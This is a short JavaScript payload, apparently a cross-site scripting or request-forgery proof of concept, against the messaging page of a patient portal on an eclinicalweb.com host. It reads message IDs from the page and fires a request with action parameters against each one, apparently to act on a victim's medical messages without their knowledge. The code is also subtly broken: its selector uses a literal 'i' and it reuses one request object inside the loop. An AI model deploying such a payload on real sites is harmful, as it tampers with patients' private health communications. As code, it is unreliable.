<script>
var req = new XMLHttpRequest();
var req2 = new XMLHttpRequest();

req.onreadystatechange = function()
{
if (req.readyState == 4 && req.status == 200 )
{
 for (i=2; i < 20; i++){
  var msgId = document.querySelector("table tr:nth-child(i)").id;
  req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&nact=1&msgid="+msgId, true);
  req2.send();
 }
}
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp");
req.send();

</script>
